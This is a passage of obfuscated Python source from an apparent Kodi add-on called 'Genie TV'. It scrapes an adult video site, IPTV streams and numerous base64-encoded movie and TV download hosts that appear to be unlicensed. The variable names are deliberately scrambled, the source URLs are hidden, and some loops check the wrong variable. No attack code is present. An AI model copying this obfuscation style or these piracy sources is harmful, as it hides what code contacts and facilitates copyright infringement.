 for i1I1I , url in oOooOOOoOo :
  oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '_' , ' ' ) , ( url ) . strip ( ) , 404 , ii11iIi1I + 'streams.png' )
def iiIiii ( url ) :
 OO00O0O = OooO0OO ( url )
 oOooOOOoOo = re . compile ( 'EXTINF:(.+?),(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , i1I1I , url in oOooOOOoOo :
  url = ( ( i1111 ( 'aHR0cDovL2dlbmlldHYuaXB0di5yZTo4MDAwL2xpdmUv' ) ) + oO0o0o0ooO0oO + '/' + oo0o0O00 + url ) . strip ( )
  oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '_' , ' ' ) , ( url ) . replace ( '.ts' , '.m3u8' ) , 10012 , oO0O00oOOoooO )
  if 39 - 39: OOOo0 + Oo
def o0OOooO ( ) :
 oOO0OOOOoooO ( 'Best Videos' , 'http://www.xvideos.com/best' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 oOO0OOOOoooO ( 'Genres' , 'http://www.xvideos.com' , 10106 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 oOO0OOOOoooO ( 'Recently Uploaded' , 'http://xvideos.com' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 oOO0OOOOoooO ( 'Tags' , 'http://www.xvideos.com/tags' , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 oOO0OOOOoooO ( 'Search' , '' , 10107 , ii11iIi1I + 'JIZBOX.png' , '' , '' , )
 if 41 - 41: i1IIi + OoOoOO00 * OO0O
def o0oOoOo0 ( url ) :
 OO00O0O = iii ( url )
 III1IiI1i1i = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( OO00O0O )
 for url in III1IiI1i1i :
  oOO0OOOOoooO ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 oOooOOOoOo = re . compile ( '<li><a href="(.+?)"><b>(.+?)</b><span class="navbadge default"(.+?)</span>' ) . findall ( OO00O0O )
 for url , i1I1I , iIiIi11 in oOooOOOoOo :
  oOO0OOOOoooO ( i1I1I + ' - No of Videos : ' + ( iIiIi11 ) . replace ( '>' , '' ) , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 94 - 94: O00oo0OO0oOOO - Oo + ii
def O0oooOoO ( url ) :
 OO00O0O = iii ( url )
 III1IiI1i1i = re . compile ( 'href="([^"]*)">Next</a></li>' ) . findall ( OO00O0O )
 for url in III1IiI1i1i :
  oOO0OOOOoooO ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10104 , ii11iIi1I + 'Next.png' , '' , '' )
 oOooOOOoOo = re . compile ( ':"([^"]*)".+?;</script></a></div></div><p class="profile-name"><a href="([^"]*)">(.+?)</a></p><p class="profile-counts">\n(.+?)\n' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , url , i1I1I , O0Oo0iIIIi1IiI11I1 in oOooOOOoOo :
  oOO0OOOOoooO ( i1I1I + '--' + O0Oo0iIIIi1IiI11I1 , 'http://www.xvideos.com' + url + '#_tabVideos,videos-best' , 10105 , ( oO0O00oOOoooO ) . replace ( 'http:\/\/' , 'http://' ) , '' , '' )
  if 71 - 71: OOooOooo - O0 - O00oo0OO0oOOO . Ii11I % Oo
  if 82 - 82: OoooooooOO + Ii11I % I1IiI . Ooo00oOo00o * i1IIi
def iIiIi1iIIi11i ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , url , i1I1I , OoOOoooOO0O , I1IIII in oOooOOOoOo :
  O00OOOoOoo0O ( i1I1I + ' - Porn Quality : ' + I1IIII + ' - ' + OoOOoooOO0O , 'http://www.xvideos.com' + url , 10108 , oO0O00oOOoooO , oO0O00oOOoooO , I1IIII + ' - ' + OoOOoooOO0O )
 OooooOoO = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( OO00O0O )
 for url in OooooOoO :
  oOO0OOOOoooO ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 79 - 79: OO0O % Ii11I
def oO0O0o0O ( url ) :
 OO00O0O = iii ( url )
 I1Ii = re . compile ( '<div class="main-categories">(.+?)</div>' , re . DOTALL ) . findall ( OO00O0O )
 III1IiI1i1i = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( OO00O0O )
 for url in III1IiI1i1i :
  oOO0OOOOoooO ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10106 , ii11iIi1I + 'Next.png' , '' , '' )
 oOooOOOoOo = re . compile ( '<li><a href="(.+?)" class="btn btn-default">(.+?)</a>' ) . findall ( str ( I1Ii ) )
 for url , i1I1I in oOooOOOoOo :
  oOO0OOOOoooO ( i1I1I , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 100 - 100: I1IiI % Oo
  if 76 - 76: OoOoOO00 / Ooo00oOo00o + OoooooooOO . ii11ii1ii . OOOO00ooo0Ooo . OO0O
def iiiI ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 iIIIiiiIiI1 = ( oOOoo00O00o ) . replace ( ' ' , '+' ) . replace ( '&amp;' , '&' )
 oooooo0O000o = iIIIiiiIiI1 . lower ( )
 O0OOoooo0 = 'http://www.xvideos.com/?k=' + oooooo0O000o
 print O0OOoooo0 + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 OO00O0O = iii ( O0OOoooo0 )
 oOooOOOoOo = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , iI1i11 , i1I1I , OoOOoooOO0O , I1IIII in oOooOOOoOo :
  O00OOOoOoo0O ( i1I1I + ' - Porn Quality : ' + I1IIII + ' - ' + OoOOoooOO0O , 'http://www.xvideos.com' + iI1i11 , 10108 , oO0O00oOOoooO , oO0O00oOOoooO , I1IIII + ' - ' + OoOOoooOO0O )
 OooooOoO = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( OO00O0O )
 for iI1i11 in OooooOoO :
  oOO0OOOOoooO ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + iI1i11 , 10105 , ii11iIi1I + 'Next.png' , '' , '' )
  if 7 - 7: o0OOOoO0
def ii1IiIi1i ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( 'flv_url=(.+?)\;' ) . findall ( OO00O0O )
 for url in oOooOOOoOo :
  OOOO00OoooO = ( url ) . replace ( '%3A' , ':' ) . replace ( '%2F' , '/' ) . replace ( '%3F' , '?' ) . replace ( '%3D' , '=' ) . replace ( '%26' , '&' ) . replace ( '&amp' , '' )
  IIIi ( OOOO00OoooO )
  if 43 - 43: i1IIi + O0 % Ooo00oOo00o / OOooOooo * OOOo0
def IIIi ( url ) :
 oooo00i1 = xbmc . Player ( OoOi1iI11Iii ( ) )
 import urlresolver
 try : oooo00i1 . play ( url )
 except : pass
 if 91 - 91: Ii11I + OO0O % OOOo0 - OO0O - ii
 if 42 - 42: I1IiI
def oooo ( ) :
 OO00O0O = iii ( i1111 ( 'aHR0cDovL3d3dy5nb2Zpc2hpbmcuY28udWsvQW5nbGluZy1UaW1lcy9TZWN0aW9uL1ZpZGVvcy8=' ) )
 oOooOOOoOo = re . compile ( 'class="item.+?"><a href="(.+?)">(.+?)</a></li>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , ( 'http://www.gofishing.co.uk' + iI1i11 ) . replace ( 'http://www.gofishing.co.ukhttp://www.gofishing.co.uk' , 'http://www.gofishing.co.uk' ) , 8091 , ii11iIi1I + 'gofish.png' )
def o0o0oo0Ooo ( url ) :
 OO00O0O = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<h2><a id=.+?href="([^"]*)">(.+?)</a></h2>' , re . DOTALL ) . findall ( OO00O0O )
 IiiiiI1i1Iii = re . compile ( '<h3><a href="([^"]*)" id=.+?>(.+?)</a> </h3>.+?<img src="([^"]*)"' , re . DOTALL ) . findall ( OO00O0O )
 next = re . compile ( 'href="([^"]*)">next</a>&gt;</li>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , ii11iIi1I + 'gofish.png' )
 for url , i1I1I , oO0O00oOOoooO in IiiiiI1i1Iii :
  oo00OOoOoO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://www.gofishing.co.uk/' + url , 8092 , 'http://www.gofishing.co.uk/' + oO0O00oOOoooO )
 for url in next :
  iii1111iiI1ii ( '[COLORgreen]NEXT[/COLOR]' , url . replace ( ' ' , '+' ) , 8091 , ii11iIi1I + 'Next.png' )
def iI1i ( url ) :
 OO00O0O = OooO0OO ( url )
 oOooOOOoOo = re . compile ( 'src="https://www.youtube.com/embed/(.+?)"' ) . findall ( OO00O0O )
 for url in oOooOOOoOo :
  yt . PlayVideo ( url )
  if 3 - 3: i1i1i11IIi / OOOO00ooo0Ooo
def Ii11 ( url ) :
 I1i1ii = urllib2 . Request ( url )
 I1i1ii . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 O0000oo00oOOO = ''
 Ii1IIiiIIi = ''
 try :
  O0000oo00oOOO = urllib2 . urlopen ( I1i1ii )
  Ii1IIiiIIi = O0000oo00oOOO . read ( )
  O0000oo00oOOO . close ( )
 except : pass
 if Ii1IIiiIIi != '' :
  return Ii1IIiiIIi
 else :
  Ii1IIiiIIi = 'Failed'
  return Ii1IIiiIIi
  if 98 - 98: ii . OoooooooOO
  if 54 - 54: O0 / i1i1i11IIi % OO0O * i1IIi * O0
def IIOOOoO00O ( ) :
 iIiii1Ii1I1II = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL2RsNC5tb3ZpZWZhcnNpLmNvbS9maWxtLzIwMTUtNy8=' ) )
 Iii1I1111ii = ( i1111 ( 'aHR0cDovL2RsLmF2YWRsLmNvbS9OZXcvTW92aWUv' ) )
 Ii1IIiI1i = ( i1111 ( 'aHR0cDovLzIxNy4yMTkuMTQzLjEwOC8xMzI3Lw==' ) )
 iIIIIII = ( i1111 ( 'aHR0cDovLzE3OC4xNjIuMjE0LjIzMi92b2QvbW92aWVzL2VuZ2xpc2gv' ) )
 IIiiI = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvbW92L2FsbC5waHA=' ) )
 iII11iiiiiii = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9Nb3ZpZS8=' ) )
 O0000 = ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL3NlYXJjaC8/cT0=' ) ) + oOOoo00O00o
 OoOOOOOO = ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21vdmllcy9hbGxtb3ZpZS5waHA=' ) )
 oo0OO0 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbG1vdmllcy5waHA=' ) )
 O0oo00o = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tb3ZmdWxsLnBocA==' ) )
 IIi1i1 = ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL1NILnBocA==' ) )
 if 84 - 84: Ii11I + OOooOooo + OOooOOo
 OO00O0O = Ii11 ( iI1i11 )
 i11i1 = Ii11 ( Iii1I1111ii )
 i1i1iIII11i = Ii11 ( Ii1IIiI1i )
 IiII = Ii11 ( iIIIIII )
 oOo = Ii11 ( IIiiI )
 oo0o = Ii11 ( O0000 )
 IioOooOOo00ooO = Ii11 ( OoOOOOOO )
 o0OO0oooo = Ii11 ( oo0OO0 )
 I11II1i1 = Ii11 ( O0oo00o )
 IiI1ii11I1 = Ii11 ( IIi1i1 )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 if 19 - 19: o0OOOoO0 + i1i1i11IIi / ii / OoOoOO00
 if 92 - 92: i1IIi % OO0O + OO0O - iIii1I11I1II1 . OOooOooo
 if OO00O0O != 'Failed' :
  oOooOOOoOo = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( OO00O0O )
  for iIIi1o0Ooo0o0Oo , i1I1I in oOooOOOoOo :
   if oOOoo00O00o in i1I1I . lower ( ) :
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '- source 1[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( iI1i11 + iIIi1o0Ooo0o0Oo ) , 222 , '' )
    Oo0oO0ooo . update ( 0 , "" , "Getting Source 1 Links" )
 if i11i1 != 'Failed' :
  IiiiiI1i1Iii = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( i11i1 )
  for iIIi1o0Ooo0o0Oo , i1I1I in IiiiiI1i1Iii :
   if oOOoo00O00o in i1I1I . lower ( ) :
    oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '- source 2[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( Iii1I1111ii + iIIi1o0Ooo0o0Oo ) , 222 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 9 , "" , "Getting Source 2 Links" )
 if i1i1iIII11i != 'Failed' :
  ooO0000o00O = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( i1i1iIII11i )
  for iIIi1o0Ooo0o0Oo , i1I1I in ooO0000o00O :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '- source 3[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( Ii1IIiI1i + iIIi1o0Ooo0o0Oo ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 18 , "" , "Getting Source 3 Links" )
 if IiII != 'Failed' :
  oo00ooooOOo00 = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( IiII )
  for iIIi1o0Ooo0o0Oo , i1I1I in oo00ooooOOo00 :
   if oOOoo00O00o in i1I1I . lower ( ) :
    oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '- source 4[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( '.' , ' ' ) , ( iIIIIII + iIIi1o0Ooo0o0Oo ) , 222 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 27 , "" , "Getting Source 4 Links" )
 if oOo != 'Failed' :
  ii1i = [ ]
  OO00Oooo000 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oOo )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in OO00Oooo000 :
   if oOOoo00O00o in i1I1I . lower ( ) :
    if i1I1I in ii1i :
     pass
    else :
     O0Oo000ooO00 ( ( '[COLORgreen]' + i1I1I + '- source Scooby[/COLOR]' ) . replace ( '..&gt;' , '' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , iI1i11 , 1016 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
     ii1i . append ( i1I1I )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 36 , "" , "Getting Scooby Links" )
     ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if oo0o != 'Failed' :
  iI1ii111iiIii = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( oo0o )
  for iI1i11 , oO0O00oOOoooO , i1I1I in iI1ii111iiIii :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '- source Snag[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + iI1i11 , 7067 , oO0O00oOOoooO )
    Oo0oO0ooo . update ( 45 , "" , "Getting Snag Links" )
    if 57 - 57: OOooOOo / o0OOOoO0
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if IioOooOOo00ooO != 'Failed' :
  iiIiII = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IioOooOOo00ooO )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in iiIiII :
   if oOOoo00O00o in i1I1I . lower ( ) :
    O00OOOoOoo0O ( ( '[COLORgreen]' + i1I1I + '- source Redemption[/COLOR]' ) , iI1i11 , 222 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 53 , "" , "Getting Redemption Links" )
    if 7 - 7: Oo - i1IIi . ii11ii1ii / iIii1I11I1II1 * OOooOOo
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if o0OO0oooo != 'Failed' :
  O0O0 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( o0OO0oooo )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in O0O0 :
   if oOOoo00O00o in i1I1I . lower ( ) :
    O00OOOoOoo0O ( ( '[COLORgreen]' + i1I1I + '- source Reaper[/COLOR]' ) , iI1i11 , 222 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 61 , "" , "Getting Reaper Links" )
    if 70 - 70: Ii11I * ii / OOOo0 * I1IiI * OOOo0
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if I11II1i1 != 'Failed' :
  OOoO0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( I11II1i1 )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in OOoO0o :
   if oOOoo00O00o in i1I1I . lower ( ) :
    O00OOOoOoo0O ( ( '[COLORgreen]' + i1I1I + '- source Herovision[/COLOR]' ) , iI1i11 , 222 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Herovision Links" )
    if 62 - 62: OOOO00ooo0Ooo / ii % Oo . OoooooooOO / i11iIiiIii / o0OOOoO0
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
    if 60 - 60: OOOo0 % ii / OOooOOo % ii * i11iIiiIii / O00oo0OO0oOOO
 if IiI1ii11I1 != 'Failed' :
  i1Ii11II = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IiI1ii11I1 )
  for iI1i11 , o0OOo0o0O0O , i1I1I in i1Ii11II :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '- source Silent Hunter[/COLOR]' ) , iI1i11 , 222 , o0OOo0o0O0O )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 78 , "" , "Getting Silent Hunter Links" )
    if 33 - 33: i1i1i11IIi . OoooooooOO . ii
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 iI1o0 = [ '480p' , '720p' , '1080p' , 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 32 - 32: OoooooooOO / OoOoOO00 / ii + OOooOooo / O0
 for I1IIIIiii1i in iI1o0 :
  o0IiiiI111I = ooooooO0oo + I1IIIIiii1i + II11iiii1Ii
  oOO0 = iii ( o0IiiiI111I )
  if oOO0 != 'Failed' :
   OoO000Oo0oO = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oOO0 )
   for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in OoO000Oo0oO :
    if oOOoo00O00o in i1I1I . lower ( ) :
     O00OOOoOoo0O ( '[COLORgreen]' + i1I1I + ' - Source Pandoras[/COLOR]' , iI1i11 , 222 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 89 , "" , "Getting Pandoras Links" )
     if 46 - 46: O0 - I1IiI . OoooooooOO
     ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
     if 19 - 19: OOooOOo
 oO00 = [ '0-9/' , 'A/' , 'B/' , 'C/' , 'D/' , 'E/' , 'F/' , 'G/' , 'H/' , 'I/' , 'J/' , 'K/' , 'L/' , 'M/' , 'N/' , 'O/' , 'P/' , 'R/' , 'S/' , 'T/' , 'U/' , 'V/' , 'W/' , 'X/' , 'Y/' , 'Z/' ]
 if 73 - 73: o0OOOoO0 * Oo * I1IiI
 if 65 - 65: i11iIiiIii + Oo * OoooooooOO - Ooo00oOo00o
 for I1IIIIiii1i in oO00 :
  o0IiiiI111I = iIiii1Ii1I1II + I1IIIIiii1i
  III11I11ii = Ii11 ( o0IiiiI111I )
  if oOo != 'Failed' :
   O0OoO0oO00 = re . compile ( '<li><a href="(.+?)"> (.+?)</a></li>' ) . findall ( III11I11ii )
   for iIIi1o0Ooo0o0Oo , i1I1I in O0OoO0oO00 :
    if oOOoo00O00o in i1I1I . lower ( ) :
     oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + 'source 5[/COLOR]' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , ( iIiii1Ii1I1II + I1IIIIiii1i + iIIi1o0Ooo0o0Oo ) , 222 , '' )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Source 5 Links" )
     if 2 - 2: o0OOOoO0 - ii11ii1ii + OOooOOo * Ooo00oOo00o / O00oo0OO0oOOO
     ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
     if 26 - 26: Ii11I * Oo
     if 31 - 31: OOOO00ooo0Ooo * ii . OOooOooo
def i1Ii11ii1I ( ) :
 if 66 - 66: Oo / OoooooooOO % o0OOOoO0 / O00oo0OO0oOOO + OoooooooOO
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 oo0OO0 = ( i1111 ( 'aHR0cDovL2Nvb2x0dnNlcmllcy5jb20vc2VhcmNoLnBocD90YWc9' ) ) + ( oOOoo00O00o ) . replace ( ' ' , '+' )
 iI1i11 = ( i1111 ( 'aHR0cDovL2RsLmZhcnNpbW92aWUubmV0L1NlcmlhbC8=' ) )
 Iii1I1111ii = ( i1111 ( 'aHR0cDovL3N2Mi5kbC1wYXJzLmluLw==' ) )
 Ii1IIiI1i = ( i1111 ( 'aHR0cDovL3R2LmRsLXBhcnMuaW4v' ) )
 iIIIIII = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9BbWVyaWNhbiUyMFNlcmlhbC8=' ) )
 IIiiI = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( oOOoo00O00o ) . replace ( ' ' , '+' )
 iII11iiiiiii = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2hvd3MvdHZhbGwucGhw' ) )
 O0000 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbHR2LnBocA==' ) )
 OoOOOOOO = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC90dmZ1bGwucGhw' ) )
 if 6 - 6: OoOoOO00 % o0OOOoO0
 o0OO0oooo = Ii11 ( oo0OO0 )
 OO00O0O = Ii11 ( iI1i11 )
 i11i1 = Ii11 ( Iii1I1111ii )
 i1i1iIII11i = Ii11 ( Ii1IIiI1i )
 IiII = Ii11 ( iIIIIII )
 oOo = cloudflare . source ( IIiiI )
 III11I11ii = Ii11 ( iII11iiiiiii )
 oo0o = Ii11 ( O0000 )
 IioOooOOo00ooO = Ii11 ( OoOOOOOO )
 if 41 - 41: i1i1i11IIi - OoOoOO00 . OoOoOO00 + OOOo0
 if IioOooOOo00ooO != 'Failed' :
  iiIiII = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IioOooOOo00ooO )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in iiIiII :
   if oOOoo00O00o in i1I1I . lower ( ) :
    O0Oo000ooO00 ( ( '[COLORgreen]' + i1I1I + '- source HeroVision[/COLOR]' ) , iI1i11 , 1016 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 10 , "" , "Getting Herovision Links" )
    if 59 - 59: iIii1I11I1II1 % OOooOooo . i11iIiiIii
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
    if 59 - 59: OOooOOo . ii . OOooOooo * I1IiI * Ooo00oOo00o + Oo
 if oo0o != 'Failed' :
  iI1ii111iiIii = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oo0o )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in iI1ii111iiIii :
   if oOOoo00O00o in i1I1I . lower ( ) :
    O0Oo000ooO00 ( ( '[COLORgreen]' + i1I1I + '- source Reaper[/COLOR]' ) , iI1i11 , 1016 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 20 , "" , "Getting Reaper Links" )
